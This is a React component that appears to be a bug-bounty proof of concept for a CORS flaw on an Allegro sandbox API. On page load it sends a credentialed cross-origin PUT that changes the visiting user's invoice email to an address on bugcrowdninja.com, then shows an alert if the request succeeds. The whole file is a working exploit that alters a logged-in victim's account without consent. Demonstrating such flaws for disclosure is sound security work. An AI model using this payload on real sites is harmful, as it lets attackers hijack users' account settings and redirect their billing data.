import React, { useEffect } from 'react';

function Cors() {
  useEffect(() => {
    const xhr = new XMLHttpRequest();
    xhr.open('PUT', 'https://edge.allegro.cz.allegrosandbox.pl/order-invoices/user-attributes', true);
    xhr.withCredentials = true;
    xhr.setRequestHeader('Content-Type', 'application/vnd.allegro.internal.v1+json');
    xhr.onload = function() {
      if (xhr.status === 200) {
        alert('CORS vulnerability detected!');
      }
    };
    xhr.send(JSON.stringify({"invoiceEmail":{"address":"mudhaxk@bugcrowdninja.com"}}));
  }, []);

  return <div></div>;
}


export default Cors
